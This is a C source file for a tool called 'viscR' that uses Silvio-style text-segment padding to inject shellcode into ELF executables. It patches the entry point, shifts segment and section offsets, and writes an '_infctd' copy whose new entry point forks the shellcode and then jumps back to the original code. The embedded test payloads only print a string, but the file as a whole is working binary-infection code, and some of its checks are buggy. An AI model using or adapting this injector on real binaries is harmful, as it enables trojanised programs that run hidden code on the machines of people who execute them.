#include <sys/stat.h>
#include <sys/mman.h>
#include <elf.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <zlib.h>
#define JMP_BACK 5
#define INTRO 40
#define PAGE_SIZE sysconf(_SC_PAGESIZE)

/*
	TODO:
	- error checks
	- b64 input support
	- refactor code (clean up, structure for elf, header files etc.)
	- wrap payload into return-to-original-flow DONE
	- shrink wrapper using smaller instructions
	- modify creation date

	MAIN LOGIC:
	1. receive b64 encoded payload and put it into structure
	2. do some elf patching  
*/

//ELF32 wont work because of arch specific instructions #TODO remade shellcode intro
#if defined(__LP64__)
# define ElfW(type) Elf64_ ## type
#else
# define ElfW(type) Elf32_ ## type
#endif

void	inject_code(char *fname, ssize_t payload_len, ssize_t fsize, char *mem, ssize_t text_end, ssize_t og_entry, ssize_t new_entry);

//FOR TESTING PURPOSES
//char payload[] = "\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6";
char payload[] = "\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6";
//char payload[] = "\x6a\x39\x58\x0f\x05\x48\x83\xf8\x00\x74\x11\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\x90\x90\x90\x90\x90\x48\xc7\xc0\x70\x00\x00\x00\x0f\x05\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\x31\xff\x6a\x3c\x58\x0f\x05";

char intro[] = "\x6a\x39\x58\x0f\x05\x48\x83\xf8\x00\x74\x11\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\x90\x90\x90\x90\x90\x6a\x70\x58\x0f\x05"; // 5 nops to keep place for jmp to og entry point
char jmp_back[] = "\xe9\xde\xad\xbe\xef";
char big_exit[] = "\x31\xff\x6a\x3c\x58\x0f\x05";

char	*open_file(char *av, ssize_t *size) {
	struct stat fdata;
	int fd;
	char *file;
	ElfW(Ehdr) *e_hdr;

	if ((fd = open(av, O_RDONLY)) == -1)
	{
		perror("open: ");
		return (NULL);
	}
	if (fstat(fd, &fdata) == -1)
	{
		perror("fstat: ");
		return (NULL);
	}

	*size = fdata.st_size;

	if ((file = mmap(0, (size_t)*size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
	{
		perror("mmap: ");
		return (NULL);
	}

	e_hdr = (ElfW(Ehdr) *)file;
	if (e_hdr->e_ident[0] != 0x7f && strcmp(&e_hdr->e_ident[1], "ELF"))
    {
            printf("%s is not an elf file\n", av);
            munmap(file, *size);
			exit(-1);
    }

	close(fd);
	return (file);
}

char	*craft_payload(char *payload, size_t psize) {

	char *new_payload = calloc(psize + INTRO, sizeof(char *));
	intro[23] = jmp_back[0];
    intro[24] = jmp_back[1];
    intro[25] = jmp_back[2];
    intro[26] = jmp_back[3];
    intro[27] = jmp_back[4];

	memcpy(new_payload, intro, sizeof(intro) - 1);
	memcpy(new_payload + sizeof(intro) - 1, payload, psize);
	memcpy(new_payload + psize + sizeof(intro) - 1, big_exit, sizeof(big_exit) - 1);

	return new_payload;
}

//MAIN LOGIC
void	silvio_inject(char *fname, ssize_t payload_len, char *payload){
	ElfW(Ehdr) 	*ehdr;
	ElfW(Phdr) 	*phdr;
	ElfW(Shdr) 	*shdr;
	ElfW(Addr)	og_entry;
	ElfW(Addr)	og_filesz;
	ElfW(Addr)	cave_off;
	ssize_t		fsize;
	ssize_t		text_end;
	char		*mem;
	
	if (!(mem = open_file(fname, &fsize)))
		exit(1);

	ehdr = (ElfW(Ehdr) *)mem;
	phdr = (ElfW(Phdr) *)&mem[ehdr->e_phoff];
	shdr = (ElfW(Shdr) *)&mem[ehdr->e_shoff];

	for (int i = 0; i < ehdr->e_phnum; i++){
		if ((phdr[i].p_type == PT_LOAD) && (phdr[i].p_flags == (PF_R | PF_X))){
			og_filesz = phdr[i].p_filesz;
			text_end = phdr[i].p_offset + phdr[i].p_filesz;
			cave_off = phdr[i].p_vaddr + og_filesz;
			og_entry = ehdr->e_entry;
			ssize_t cave_size = abs((phdr[i].p_vaddr + phdr[i].p_align) - cave_off); 
			printf("Reverse text size: %d\n", phdr[i].p_vaddr - (0x1000 + sizeof(ElfW(Ehdr))));
			ehdr->e_entry = cave_off;
			if (cave_size < payload_len ){
				//make clean_exit()
				dprintf(2, "Cave is too small to handle payload\n");
				//fclose(fd);
				free(mem);
				exit(1);
			}
			phdr[i].p_filesz += payload_len + INTRO;
			phdr[i].p_memsz += payload_len + INTRO;

			//For each phdr whose segment is after the parasite, increase phdr[x].p_offset by PAGE_SIZE bytes
			for (int j = i + 1; j < ehdr->e_phnum; j++){
				if (phdr[j].p_offset > phdr[i].p_offset){
					phdr[j].p_offset += PAGE_SIZE;
				}
			}
			
			printf("Found cave at: 0x%lx; With the size of: %d ; Payload size: %d\n", cave_off , cave_size, payload_len);
			break;
		}
	}

	//For every shdr that exists after the parasite insertion, increase shdr[x].sh_offset by PAGE_SIZE.
	//last shdr in the text segment and increase shdr[x].sh_size by the length of the parasite (because this is the section that the parasite will exist in)
	for (int i = 0; i < ehdr->e_shnum; i++){
		if (shdr[i].sh_offset >= text_end)
			shdr[i].sh_offset += PAGE_SIZE;
		else if ((shdr[i].sh_addr + shdr[i].sh_size) == cave_off)
			shdr[i].sh_size += payload_len + INTRO;
	}
	ehdr->e_shoff += PAGE_SIZE;

	//patch binary
	inject_code(fname, payload_len, fsize, mem, text_end, og_entry, cave_off);

}

void	inject_code(char *fname, ssize_t payload_len, ssize_t fsize, char *mem, ssize_t text_end, ssize_t og_entry, ssize_t new_entry){
	int 			fd;
	unsigned int	c;
	int i, t = 0;
	char fcopy[256];

	snprintf(fcopy, sizeof(fcopy), "%s_infctd", fname);
	fd = open(fcopy, O_CREAT | O_WRONLY | O_TRUNC, 0755);
	write(fd, mem, text_end);

	int jmp_addr = (og_entry - (new_entry + 28)); // fork + cmp + je + xors + jmp to og_entry
	//printf("jmp addr = %d\npayload = %d\n", jmp_addr, sizeof(payload));
	memcpy(jmp_back + 1, &jmp_addr, sizeof(jmp_addr));
	char *new_payload = craft_payload(payload, payload_len);
	write(fd, new_payload, payload_len + INTRO);
	lseek(fd, PAGE_SIZE - (payload_len + INTRO), SEEK_CUR);
	mem += text_end;

	unsigned int last_chunk = fsize - text_end;
	write(fd, mem, last_chunk);
	munmap(mem, fsize);
	close(fd);
}

int main(int ac, char **av) {

	ElfW(Ehdr)	ehdr;
	ssize_t		cave; 
	ssize_t		fsize;
	ssize_t		csize;
	long 		base;
	char 		*file; 
	FILE 		*fd;
	size_t 		payload_len;

	if (ac < 2){
		printf("viscR --- Shellcode Injector\n");
		printf("Usage: ./viscR <binary> <b64 encoded payload>\n");
		exit(0);
	}
	
	//init struct for readability
	
	payload_len = sizeof(payload) - 1;

	silvio_inject(av[1], payload_len, payload);
	return 0;
};
